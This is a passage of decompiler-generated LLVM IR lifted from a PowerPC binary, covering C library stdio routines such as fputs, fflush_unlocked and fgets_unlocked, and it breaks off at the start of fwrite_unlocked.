define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r29.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_100097ec = call i32 @__asm_mfcr()
  store i32 %arg2, i32* %r31.global-to-local, align 4
  store i32 %v0_100097ec, i32* %r29.global-to-local, align 4
  %v2_1000980c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000980c, i32* @r3, align 4
  %v1_10009810 = add i32 %arg2, 52
  %v2_10009810 = inttoptr i32 %v1_10009810 to i32*
  %v3_10009810 = load i32, i32* %v2_10009810, align 4
  %v3_1000981c = icmp eq i32 %v3_10009810, 0
  store i1 %v3_1000981c, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_1000981c, label %dec_label_pc_10009824, label %dec_label_pc_10009830

dec_label_pc_10009824:                            ; preds = %entry
  %v0_10009824 = call i32 @__pthread_return_void()
  %v0_1000982c = call i32 @__pthread_return_0()
  %v0_10009830.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_10009834.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10009830

dec_label_pc_10009830:                            ; preds = %entry, %dec_label_pc_10009824
  %v0_10009834 = phi i32 [ %v0_100097ec, %entry ], [ %v0_10009834.pre, %dec_label_pc_10009824 ]
  %v0_10009830 = phi i32 [ %arg2, %entry ], [ %v0_10009830.pre, %dec_label_pc_10009824 ]
  store i32 268474428, i32* @lr, align 4
  %v2_10009838 = call i32 @__GI_fputs_unlocked(i32 %v0_10009834, i32 %v0_10009830)
  store i32 %v2_10009838, i32* %r31.global-to-local, align 4
  store i32 %v2_1000980c, i32* @r3, align 4
  %v0_10009848 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10009848, label %dec_label_pc_1000984c, label %dec_label_pc_10009850

dec_label_pc_1000984c:                            ; preds = %dec_label_pc_10009830
  %v0_1000984c = call i32 @__pthread_return_void()
  %v0_10009854.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10009850

dec_label_pc_10009850:                            ; preds = %dec_label_pc_10009830, %dec_label_pc_1000984c
  %v0_10009854 = phi i32 [ %v2_10009838, %dec_label_pc_10009830 ], [ %v0_10009854.pre, %dec_label_pc_1000984c ]
  %v1_10009864 = call %0 @__asm_mtcrf(i32 8, i32 %v0_100097ec)
  %v9_10009864 = extractvalue %0 %v1_10009864, 7
  store i4 %v9_10009864, i4* @cr4, align 1
  ret i32 %v0_10009854

; uselistorder directives
  uselistorder i32 %v0_100097ec, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @__GI_fputs_unlocked, { 1, 0 }
  uselistorder label %dec_label_pc_10009850, { 1, 0 }
  uselistorder label %dec_label_pc_10009830, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000c0d8.561 to i32), i32* @r31, align 4
  store i32 ptrtoint (i32* @global_var_100246c4.562 to i32), i32* @r29, align 4
  %v2_10009894 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10009894, i32* @r3, align 4
  %v0_1000989c = call i32 @__pthread_return_void()
  %v0_100098a4 = call i32 @__pthread_return_0()
  %v3_100098ac = load i32, i32* @global_var_10024a58.563, align 4
  %v3_100098b0 = icmp eq i32 %v3_100098ac, 1
  br i1 %v3_100098b0, label %dec_label_pc_100098b8, label %dec_label_pc_10009960

dec_label_pc_100098b8:                            ; preds = %entry
  %v3_100098bc = load i32, i32* @global_var_10024a5c.564, align 4
  %tmp7 = icmp slt i32 %v3_100098bc, 1
  br i1 %tmp7, label %dec_label_pc_10009960, label %dec_label_pc_100098c8

dec_label_pc_100098c8:                            ; preds = %dec_label_pc_100098b8
  %v2_100098d4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_100098d4, i32* @r3, align 4
  store i32 0, i32* @r30, align 4
  %v0_100098e0 = call i32 @__pthread_return_void()
  %v0_100098e8 = call i32 @__pthread_return_0()
  %storemerge8 = load i32, i32* bitcast (i32** @global_var_10024a08.569 to i32*), align 4
  store i32 %storemerge8, i32* @r29, align 4
  %v3_1000994011 = icmp eq i32 %storemerge8, 0
  %v0_1000994412 = load i32, i32* @r30, align 4
  br i1 %v3_1000994011, label %dec_label_pc_1000994c, label %dec_label_pc_100098f8

dec_label_pc_100098f8:                            ; preds = %dec_label_pc_100098c8, %dec_label_pc_10009940.backedge
  %v0_1000994417 = phi i32 [ %v0_10009944, %dec_label_pc_10009940.backedge ], [ %v0_1000994412, %dec_label_pc_100098c8 ]
  %v3_1000994418.in = phi i32 [ %v0_10009944, %dec_label_pc_10009940.backedge ], [ %v0_1000994412, %dec_label_pc_100098c8 ]
  %storemerge16 = phi i32 [ %storemerge, %dec_label_pc_10009940.backedge ], [ %storemerge8, %dec_label_pc_100098c8 ]
  %v1_100098f8 = inttoptr i32 %storemerge16 to i16*
  %v2_100098f8 = load i16, i16* %v1_100098f8, align 2
  %v1_100098fc = add i32 %storemerge16, 32
  %v2_100098fc = inttoptr i32 %v1_100098fc to i32*
  %v3_100098fc = load i32, i32* %v2_100098fc, align 4
  store i32 %v3_100098fc, i32* @r31, align 4
  %v1_10009900 = and i16 %v2_100098f8, -32720
  %v3_10009904 = icmp eq i16 %v1_10009900, 48
  br i1 %v3_10009904, label %dec_label_pc_10009914, label %dec_label_pc_1000990c

dec_label_pc_1000990c:                            ; preds = %dec_label_pc_100098f8
  store i32 %storemerge16, i32* @r30, align 4
  br label %dec_label_pc_10009940.backedge

dec_label_pc_10009914:                            ; preds = %dec_label_pc_100098f8
  %v3_1000994418 = icmp eq i32 %v3_1000994418.in, 0
  br i1 %v3_1000994418, label %dec_label_pc_10009918, label %dec_label_pc_10009924

dec_label_pc_10009918:                            ; preds = %dec_label_pc_10009914
  store i32 %v3_100098fc, i32* bitcast (i32** @global_var_10024a08.569 to i32*), align 4
  br label %dec_label_pc_10009928

dec_label_pc_10009924:                            ; preds = %dec_label_pc_10009914
  %v2_10009924 = add i32 %v0_1000994417, 32
  %v3_10009924 = inttoptr i32 %v2_10009924 to i32*
  store i32 %v3_100098fc, i32* %v3_10009924, align 4
  %v0_10009928.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10009928

dec_label_pc_10009928:                            ; preds = %dec_label_pc_10009918, %dec_label_pc_10009924
  %v0_10009928 = phi i32 [ %storemerge16, %dec_label_pc_10009918 ], [ %v0_10009928.pre, %dec_label_pc_10009924 ]
  %v1_10009928 = inttoptr i32 %v0_10009928 to i16*
  %v2_10009928 = load i16, i16* %v1_10009928, align 2
  store i32 %v0_10009928, i32* @r3, align 4
  %v1_10009930 = and i16 %v2_10009928, 8192
  %v3_10009930 = icmp eq i16 %v1_10009930, 0
  br i1 %v3_10009930, label %dec_label_pc_10009940.backedge, label %dec_label_pc_10009938

dec_label_pc_10009940.backedge:                   ; preds = %dec_label_pc_10009928, %dec_label_pc_1000990c, %dec_label_pc_10009938
  %storemerge = load i32, i32* @r31, align 4
  store i32 %storemerge, i32* @r29, align 4
  %v3_10009940 = icmp eq i32 %storemerge, 0
  %v0_10009944 = load i32, i32* @r30, align 4
  br i1 %v3_10009940, label %dec_label_pc_1000994c, label %dec_label_pc_100098f8

dec_label_pc_10009938:                            ; preds = %dec_label_pc_10009928
  store i32 268474684, i32* @lr, align 4
  %v0_10009938 = call i32 @free()
  br label %dec_label_pc_10009940.backedge

dec_label_pc_1000994c:                            ; preds = %dec_label_pc_10009940.backedge, %dec_label_pc_100098c8
  store i32 %v2_100098d4, i32* @r3, align 4
  %v0_10009954 = call i32 @__pthread_return_void()
  %v0_1000995c = load i32, i32* @r29, align 4
  store i32 %v0_1000995c, i32* @global_var_10024a5c.564, align 4
  %v3_10009968.pre = load i32, i32* @global_var_10024a58.563, align 4
  br label %dec_label_pc_10009960

dec_label_pc_10009960:                            ; preds = %entry, %dec_label_pc_100098b8, %dec_label_pc_1000994c
  %v3_10009968 = phi i32 [ %v3_100098ac, %entry ], [ 1, %dec_label_pc_100098b8 ], [ %v3_10009968.pre, %dec_label_pc_1000994c ]
  store i32 %v2_10009894, i32* @r3, align 4
  %v1_10009970 = add i32 %v3_10009968, -1
  store i32 %v1_10009970, i32* @global_var_10024a58.563, align 4
  %v0_10009978 = call i32 @__pthread_return_void()
  ret i32 %v0_10009978

; uselistorder directives
  uselistorder i32 %v0_10009944, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_10009928, { 1, 0 }
  uselistorder i32 %v3_100098fc, { 1, 0, 2 }
  uselistorder i32 %storemerge16, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10009960, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10009940.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009928, { 1, 0 }
  uselistorder label %dec_label_pc_100098f8, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32** @global_var_10024a08.569 to i32), i32* %r9.global-to-local, align 4
  %v5_100099a0 = icmp eq i16* %arg1, bitcast (i32** @global_var_10024a08.569 to i16*)
  store i32 %tmp, i32* @r29, align 4
  store i32 0, i32* @r27, align 4
  br i1 %v5_100099a0, label %dec_label_pc_100099c4, label %dec_label_pc_100099b8

dec_label_pc_100099b8:                            ; preds = %entry
  %v4_100099b8 = icmp eq i16* %arg1, null
  store i32 256, i32* @r27, align 4
  br i1 %v4_100099b8, label %dec_label_pc_100099c4, label %dec_label_pc_10009af0

dec_label_pc_100099c4:                            ; preds = %dec_label_pc_100099b8, %entry
  store i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000c0d8.561 to i32), i32* @r30, align 4
  %v2_100099d0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_100099d0, i32* @r3, align 4
  %v0_100099e4 = call i32 @__pthread_return_void()
  %v0_100099ec = call i32 @__pthread_return_0()
  %v3_100099f4 = load i32, i32* @global_var_10024a58.563, align 4
  store i32 %v2_100099d0, i32* @r3, align 4
  %v1_10009a04 = add i32 %v3_100099f4, 1
  store i32 %v1_10009a04, i32* %r9.global-to-local, align 4
  store i32 %v1_10009a04, i32* @global_var_10024a58.563, align 4
  %v0_10009a10 = call i32 @__pthread_return_void()
  store i32 %v2_100099d0, i32* @r3, align 4
  %v0_10009a20 = call i32 @__pthread_return_void()
  %v0_10009a28 = call i32 @__pthread_return_0()
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 %v2_100099d0, i32* @r3, align 4
  %v3_10009a34 = load i32, i32* bitcast (i32** @global_var_10024a08.569 to i32*), align 4
  store i32 %v3_10009a34, i32* @r31, align 4
  store i32 0, i32* @r28, align 4
  %v0_10009a40 = call i32 @__pthread_return_void()
  %v0_10009ae0.pr = load i32, i32* @r31, align 4
  %v3_10009ae03 = icmp eq i32 %v0_10009ae0.pr, 0
  br i1 %v3_10009ae03, label %dec_label_pc_10009ae8, label %dec_label_pc_10009a48

dec_label_pc_10009a48:                            ; preds = %dec_label_pc_100099c4, %dec_label_pc_10009adc
  %v0_10009a64 = phi i32 [ %v3_10009adc, %dec_label_pc_10009adc ], [ %v0_10009ae0.pr, %dec_label_pc_100099c4 ]
  %v1_10009a48 = inttoptr i32 %v0_10009a64 to i16*
  %v2_10009a48 = load i16, i16* %v1_10009a48, align 2
  %v3_10009a48 = zext i16 %v2_10009a48 to i32
  %v1_10009a4c = and i32 %v3_10009a48, 64
  store i32 %v1_10009a4c, i32* %r9.global-to-local, align 4
  %v3_10009a4c = icmp eq i32 %v1_10009a4c, 0
  br i1 %v3_10009a4c, label %dec_label_pc_10009adc, label %dec_label_pc_10009a54

dec_label_pc_10009a54:                            ; preds = %dec_label_pc_10009a48
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_10009a58 = load i32, i32* @global_var_10024a0c.567, align 4
  %v3_10009a5c = icmp eq i32 %v3_10009a58, 2
  br i1 %v3_10009a5c, label %dec_label_pc_10009a80, label %dec_label_pc_10009a64

dec_label_pc_10009a64:                            ; preds = %dec_label_pc_10009a54
  store i32 %v2_100099d0, i32* @r3, align 4
  %v0_10009a74 = call i32 @__pthread_return_void()
  %v0_10009a7c = call i32 @__pthread_return_0()
  %v0_10009a80.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10009a80

dec_label_pc_10009a80:                            ; preds = %dec_label_pc_10009a54, %dec_label_pc_10009a64
  %v0_10009a94 = phi i32 [ %v0_10009a64, %dec_label_pc_10009a54 ], [ %v0_10009a80.pre, %dec_label_pc_10009a64 ]
  %v1_10009a80 = inttoptr i32 %v0_10009a94 to i16*
  %v2_10009a80 = load i16, i16* %v1_10009a80, align 2
  %v3_10009a80 = zext i16 %v2_10009a80 to i32
  %v0_10009a84 = load i32, i32* @r27, align 4
  %v2_10009a84 = or i32 %v0_10009a84, %v3_10009a80
  %v1_10009a88 = and i32 %v2_10009a84, 832
  %v1_10009a8c = xor i32 %v1_10009a88, 320
  store i32 %v1_10009a8c, i32* %r9.global-to-local, align 4
  %v3_10009a8c = icmp eq i32 %v1_10009a8c, 0
  br i1 %v3_10009a8c, label %dec_label_pc_10009a94, label %dec_label_pc_10009ac0

dec_label_pc_10009a94:                            ; preds = %dec_label_pc_10009a80
  store i32 %v0_10009a94, i32* @r3, align 4
  store i32 268475036, i32* @lr, align 4
  %v0_10009a98 = call i32 @__stdio_wcommit()
  %v3_10009a9c = icmp eq i32 %v0_10009a98, 0
  br i1 %v3_10009a9c, label %dec_label_pc_10009aac, label %dec_label_pc_10009aa4

dec_label_pc_10009aa4:                            ; preds = %dec_label_pc_10009a94
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_10009ac0

dec_label_pc_10009aac:                            ; preds = %dec_label_pc_10009a94
  %v0_10009aac = load i32, i32* @r31, align 4
  %v1_10009aac = inttoptr i32 %v0_10009aac to i16*
  %v2_10009aac = load i16, i16* %v1_10009aac, align 2
  %v3_10009aac = zext i16 %v2_10009aac to i32
  %v1_10009ab0 = add i32 %v0_10009aac, 8
  %v2_10009ab0 = inttoptr i32 %v1_10009ab0 to i32*
  %v3_10009ab0 = load i32, i32* %v2_10009ab0, align 4
  store i32 %v3_10009ab0, i32* %r9.global-to-local, align 4
  %v1_10009ab4 = call i32 @__asm_rlwinm(i32 %v3_10009aac, i32 0, i32 26, i32 24)
  %v2_10009ab4 = trunc i32 %v1_10009ab4 to i16
  %v1_10009ab8 = load i32, i32* @r31, align 4
  %v2_10009ab8 = add i32 %v1_10009ab8, 28
  %v3_10009ab8 = inttoptr i32 %v2_10009ab8 to i32*
  store i32 %v3_10009ab0, i32* %v3_10009ab8, align 4
  %v3_10009abc = load i32, i32* @r31, align 4
  %v4_10009abc = inttoptr i32 %v3_10009abc to i16*
  store i16 %v2_10009ab4, i16* %v4_10009abc, align 2
  br label %dec_label_pc_10009ac0

dec_label_pc_10009ac0:                            ; preds = %dec_label_pc_10009a80, %dec_label_pc_10009aa4, %dec_label_pc_10009aac
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_10009ac4 = load i32, i32* @global_var_10024a0c.567, align 4
  %v3_10009ac8 = icmp eq i32 %v3_10009ac4, 2
  br i1 %v3_10009ac8, label %dec_label_pc_10009adc, label %dec_label_pc_10009ad0

dec_label_pc_10009ad0:                            ; preds = %dec_label_pc_10009ac0
  store i32 %v2_100099d0, i32* @r3, align 4
  %v0_10009ad8 = call i32 @__pthread_return_void()
  br label %dec_label_pc_10009adc

dec_label_pc_10009adc:                            ; preds = %dec_label_pc_10009ac0, %dec_label_pc_10009a48, %dec_label_pc_10009ad0
  %v0_10009adc = load i32, i32* @r31, align 4
  %v1_10009adc = add i32 %v0_10009adc, 32
  %v2_10009adc = inttoptr i32 %v1_10009adc to i32*
  %v3_10009adc = load i32, i32* %v2_10009adc, align 4
  store i32 %v3_10009adc, i32* @r31, align 4
  %v3_10009ae0 = icmp eq i32 %v3_10009adc, 0
  br i1 %v3_10009ae0, label %dec_label_pc_10009ae8, label %dec_label_pc_10009a48

dec_label_pc_10009ae8:                            ; preds = %dec_label_pc_10009adc, %dec_label_pc_100099c4
  store i32 ptrtoint (i32* @global_var_10009aec.592 to i32), i32* @lr, align 4
  %v0_10009ae8 = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_10009b28

dec_label_pc_10009af0:                            ; preds = %dec_label_pc_100099b8
  %v3_10009af0 = load i16, i16* %arg1, align 2
  %v4_10009af0 = zext i16 %v3_10009af0 to i32
  store i32 0, i32* @r28, align 4
  %v1_10009af8 = and i32 %v4_10009af0, 64
  store i32 %v1_10009af8, i32* %r9.global-to-local, align 4
  %v3_10009af8 = icmp eq i32 %v1_10009af8, 0
  br i1 %v3_10009af8, label %dec_label_pc_10009b28, label %dec_label_pc_10009b00

dec_label_pc_10009b00:                            ; preds = %dec_label_pc_10009af0
  store i32 268475140, i32* @lr, align 4
  %v0_10009b00 = call i32 @__stdio_wcommit()
  store i32 -1, i32* @r28, align 4
  %v3_10009b08 = icmp eq i32 %v0_10009b00, 0
  br i1 %v3_10009b08, label %dec_label_pc_10009b10, label %dec_label_pc_10009b28

dec_label_pc_10009b10:                            ; preds = %dec_label_pc_10009b00
  %v0_10009b10 = load i32, i32* @r29, align 4
  %v1_10009b10 = inttoptr i32 %v0_10009b10 to i16*
  %v2_10009b10 = load i16, i16* %v1_10009b10, align 2
  %v3_10009b10 = zext i16 %v2_10009b10 to i32
  store i32 0, i32* @r28, align 4
  %v1_10009b18 = add i32 %v0_10009b10, 8
  %v2_10009b18 = inttoptr i32 %v1_10009b18 to i32*
  %v3_10009b18 = load i32, i32* %v2_10009b18, align 4
  store i32 %v3_10009b18, i32* %r9.global-to-local, align 4
  %v1_10009b1c = call i32 @__asm_rlwinm(i32 %v3_10009b10, i32 0, i32 26, i32 24)
  %v2_10009b1c = trunc i32 %v1_10009b1c to i16
  %v3_10009b20 = load i32, i32* @r29, align 4
  %v4_10009b20 = inttoptr i32 %v3_10009b20 to i16*
  store i16 %v2_10009b1c, i16* %v4_10009b20, align 2
  %v0_10009b24 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009b24 = load i32, i32* @r29, align 4
  %v2_10009b24 = add i32 %v1_10009b24, 28
  %v3_10009b24 = inttoptr i32 %v2_10009b24 to i32*
  store i32 %v0_10009b24, i32* %v3_10009b24, align 4
  br label %dec_label_pc_10009b28

dec_label_pc_10009b28:                            ; preds = %dec_label_pc_10009b00, %dec_label_pc_10009af0, %dec_label_pc_10009ae8, %dec_label_pc_10009b10
  %v0_10009b2c = load i32, i32* @r28, align 4
  ret i32 %v0_10009b2c

; uselistorder directives
  uselistorder i32 %v3_10009adc, { 1, 2, 0 }
  uselistorder i32 %v1_10009a8c, { 1, 0 }
  uselistorder i32 %v2_100099d0, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11 }
  uselistorder i32* bitcast (i32** @global_var_10024a08.569 to i32*), { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32* @global_var_10024a58.563, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i16* %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_10009b28, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10009adc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009ac0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10009a80, { 1, 0 }
  uselistorder label %dec_label_pc_10009a48, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* @r29, align 4
  store i32 %tmp, i32* @r28, align 4
  store i32 %arg3, i32* @r30, align 4
  %tmp19 = icmp slt i32 %arg2, 1
  br i1 %tmp19, label %dec_label_pc_10009be8, label %dec_label_pc_10009b60

dec_label_pc_10009b60:                            ; preds = %entry
  store i32 %tmp, i32* @r31, align 4
  %v2_10009bc83 = add i32 %arg2, -1
  store i32 %v2_10009bc83, i32* @r29, align 4
  %v4_10009bd09 = icmp eq i32 %arg2, 1
  br i1 %v4_10009bd09, label %dec_label_pc_10009bd4, label %dec_label_pc_10009b68

dec_label_pc_10009b68:                            ; preds = %dec_label_pc_10009b60, %dec_label_pc_10009bc8.backedge
  %v2_10009b84 = phi i32 [ %v2_10009b8412, %dec_label_pc_10009bc8.backedge ], [ %tmp, %dec_label_pc_10009b60 ]
  %v0_10009b68 = phi i32 [ %v0_10009bcc, %dec_label_pc_10009bc8.backedge ], [ %arg3, %dec_label_pc_10009b60 ]
  %v1_10009b68 = add i32 %v0_10009b68, 16
  %v2_10009b68 = inttoptr i32 %v1_10009b68 to i32*
  %v3_10009b68 = load i32, i32* %v2_10009b68, align 4
  %v1_10009b6c = add i32 %v0_10009b68, 24
  %v2_10009b6c = inttoptr i32 %v1_10009b6c to i32*
  %v3_10009b6c = load i32, i32* %v2_10009b6c, align 4
  %v2_10009b70 = add i32 %v3_10009b68, 1
  store i32 %v2_10009b70, i32* %r11.global-to-local, align 4
  %v3_10009b74 = icmp ult i32 %v3_10009b68, %v3_10009b6c
  %v5_10009b74 = icmp eq i32 %v3_10009b68, %v3_10009b6c
  store i1 %v5_10009b74, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10009b74, label %dec_label_pc_10009b7c, label %dec_label_pc_10009b98

dec_label_pc_10009b7c:                            ; preds = %dec_label_pc_10009b68
  %v4_10009b68 = inttoptr i32 %v3_10009b68 to i8*
  %v3_10009b7c = load i8, i8* %v4_10009b68, align 1
  %v3_10009b80 = icmp eq i8 %v3_10009b7c, 10
  store i1 %v3_10009b80, i1* %cr7_eq.global-to-local, align 1
  %v3_10009b84 = inttoptr i32 %v2_10009b84 to i8*
  store i8 %v3_10009b7c, i8* %v3_10009b84, align 1
  %v0_10009b88 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009b88 = load i32, i32* @r30, align 4
  %v2_10009b88 = add i32 %v1_10009b88, 16
  %v3_10009b88 = inttoptr i32 %v2_10009b88 to i32*
  store i32 %v0_10009b88, i32* %v3_10009b88, align 4
  %v0_10009b8c = load i32, i32* @r31, align 4
  %v1_10009b8c = add i32 %v0_10009b8c, 1
  store i32 %v1_10009b8c, i32* @r31, align 4
  %v0_10009b90 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10009b90, label %dec_label_pc_10009bd4, label %dec_label_pc_10009bc8.backedge

dec_label_pc_10009b98:                            ; preds = %dec_label_pc_10009b68
  %v1_10009bcc10 = inttoptr i32 %v0_10009b68 to i16*
  store i32 268475292, i32* @lr, align 4
  %v5_10009b98 = call i32 @getc_unlocked(i16* %v1_10009bcc10, i32 %v3_10009b68)
  %v6_10009b98 = trunc i32 %v5_10009b98 to i8
  %v4_10009b9c = icmp eq i8 %v6_10009b98, -1
  store i1 %v4_10009b9c, i1* %cr7_eq.global-to-local, align 1
  %v3_10009ba4 = icmp eq i8 %v6_10009b98, 10
  store i1 %v3_10009ba4, i1* %cr6_eq.global-to-local, align 1
  br i1 %v4_10009b9c, label %dec_label_pc_10009bac, label %dec_label_pc_10009bbc

dec_label_pc_10009bac:                            ; preds = %dec_label_pc_10009b98
  %v0_10009bac = load i32, i32* @r30, align 4
  %v1_10009bac = inttoptr i32 %v0_10009bac to i16*
  %v2_10009bac = load i16, i16* %v1_10009bac, align 2
  %v1_10009bb0 = and i16 %v2_10009bac, 8
  %v3_10009bb0 = icmp eq i16 %v1_10009bb0, 0
  br i1 %v3_10009bb0, label %dec_label_pc_10009bac.dec_label_pc_10009bd4_crit_edge, label %dec_label_pc_10009be8

dec_label_pc_10009bac.dec_label_pc_10009bd4_crit_edge: ; preds = %dec_label_pc_10009bac
  %v0_10009bd4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10009bd4

dec_label_pc_10009bbc:                            ; preds = %dec_label_pc_10009b98
  %v3_10009bbc = load i32, i32* @r31, align 4
  %v4_10009bbc = inttoptr i32 %v3_10009bbc to i8*
  store i8 %v6_10009b98, i8* %v4_10009bbc, align 1
  %v0_10009bc0 = load i32, i32* @r31, align 4
  %v1_10009bc0 = add i32 %v0_10009bc0, 1
  store i32 %v1_10009bc0, i32* @r31, align 4
  %v0_10009bc4 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_10009bc4, label %dec_label_pc_10009bd4, label %dec_label_pc_10009bc8.backedge

dec_label_pc_10009bc8.backedge:                   ; preds = %dec_label_pc_10009bbc, %dec_label_pc_10009b7c
  %v2_10009b8412 = phi i32 [ %v1_10009bc0, %dec_label_pc_10009bbc ], [ %v1_10009b8c, %dec_label_pc_10009b7c ]
  %v0_10009bc8 = load i32, i32* @r29, align 4
  %v2_10009bc8 = add i32 %v0_10009bc8, -1
  store i32 %v2_10009bc8, i32* @r29, align 4
  %v0_10009bcc = load i32, i32* @r30, align 4
  %v4_10009bd0 = icmp eq i32 %v0_10009bc8, 1
  br i1 %v4_10009bd0, label %dec_label_pc_10009bd4, label %dec_label_pc_10009b68

dec_label_pc_10009bd4:                            ; preds = %dec_label_pc_10009bbc, %dec_label_pc_10009bc8.backedge, %dec_label_pc_10009b7c, %dec_label_pc_10009b60, %dec_label_pc_10009bac.dec_label_pc_10009bd4_crit_edge
  %v2_10009be0 = phi i32 [ %v0_10009bd4.pre, %dec_label_pc_10009bac.dec_label_pc_10009bd4_crit_edge ], [ %tmp, %dec_label_pc_10009b60 ], [ %v1_10009b8c, %dec_label_pc_10009b7c ], [ %v2_10009b8412, %dec_label_pc_10009bc8.backedge ], [ %v1_10009bc0, %dec_label_pc_10009bbc ]
  %v1_10009bd4 = load i32, i32* @r28, align 4
  %v3_10009bd4 = icmp ugt i32 %v2_10009be0, %v1_10009bd4
  %v4_10009bd4 = icmp eq i32 %v2_10009be0, %v1_10009bd4
  store i1 %v4_10009bd4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10009bd4, label %dec_label_pc_10009bdc, label %dec_label_pc_10009be8

dec_label_pc_10009bdc:                            ; preds = %dec_label_pc_10009bd4
  %v3_10009be0 = inttoptr i32 %v2_10009be0 to i8*
  store i8 0, i8* %v3_10009be0, align 1
  %v0_10009bf0.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10009bec

dec_label_pc_10009be8:                            ; preds = %dec_label_pc_10009bac, %dec_label_pc_10009bd4, %entry
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10009bec

dec_label_pc_10009bec:                            ; preds = %dec_label_pc_10009bdc, %dec_label_pc_10009be8
  %v0_10009bf0 = phi i32 [ %v0_10009bf0.pre, %dec_label_pc_10009bdc ], [ 0, %dec_label_pc_10009be8 ]
  ret i32 %v0_10009bf0

; uselistorder directives
  uselistorder i32 %v2_10009be0, { 0, 2, 1 }
  uselistorder i8 %v6_10009b98, { 1, 0, 2 }
  uselistorder i32 %v3_10009b6c, { 1, 0 }
  uselistorder i32 %v3_10009b68, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_10009b68, { 2, 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i8 -1, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10009bec, { 1, 0 }
  uselistorder label %dec_label_pc_10009be8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10009bd4, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_10009b68, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_10009c1c = call i32 @__GI_strlen()
  store i32 %v0_10009c1c, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_10009c38.593 to i32), i32* @lr, align 4
  %v4_10009c34 = inttoptr i32 %arg2 to i16*
  %v5_10009c34 = call i32 @__GI_fwrite_unlocked(i32 %arg1, i32 1, i32 %v0_10009c1c, i16* %v4_10009c34)
  %v1_10009c3c = load i32, i32* @r27, align 4
  %v4_10009c3c = icmp eq i32 %v5_10009c34, %v1_10009c3c
  br i1 %v4_10009c3c, label %dec_label_pc_10009c44, label %dec_label_pc_10009c48

dec_label_pc_10009c44:                            ; preds = %entry
  br label %dec_label_pc_10009c48

dec_label_pc_10009c48:                            ; preds = %entry, %dec_label_pc_10009c44
  %v0_10009c48 = phi i32 [ -1, %entry ], [ %v5_10009c34, %dec_label_pc_10009c44 ]
  ret i32 %v0_10009c48

; uselistorder directives
  uselistorder label %dec_label_pc_10009c48, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg1, i32* @r28, align 4
  %v3_10009c78 = load i16, i16* %arg4, align 2
